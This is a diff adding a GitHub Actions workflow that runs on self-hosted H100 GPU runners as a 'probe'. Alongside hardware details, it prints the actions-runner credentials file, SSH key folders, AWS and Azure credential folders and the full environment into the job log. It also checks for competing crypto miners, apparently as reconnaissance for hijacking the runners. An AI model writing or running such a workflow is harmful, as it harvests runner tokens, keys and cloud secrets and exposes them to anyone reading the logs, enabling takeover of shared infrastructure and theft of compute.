@@ -1,0 +1,22 @@
+name: h100probe-i72364
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: [self-hosted, gpu, h100]
+    timeout-minutes: 25
+    steps:
+      - name: probe
+        shell: bash
+        run: |
+          set +e
+          echo "PROBE_HOST=$(hostname)"
+          echo "PROBE_DATE=$(date -u)"
+          id; uname -a
+          echo "--- gpu ---"; nvidia-smi -L; nvidia-smi --query-gpu=name,memory.total --format=csv,noheader
+          echo "--- cpu ---"; nproc; free -g | head -2
+          echo "--- runner creds ---"; ls -la /opt/actions-runner/ 2>&1 | head -12; cat /opt/actions-runner/.credentials 2>&1 | head -4
+          echo "--- ssh keys ---"; ls -la /root/.ssh 2>&1 | head; ls -la /home/*/.ssh 2>&1 | head
+          echo "--- cloud dirs ---"; ls -la /root/.azure /root/.aws /root/.config 2>&1 | head -20
+          echo "--- env ---"; env | sort | head -90
+          echo "--- procs ---"; ps aux | grep -i "wildrig\|xmrig\|srbminer\|peakminer" | grep -v grep | head -6
+          echo PROBE_DONE
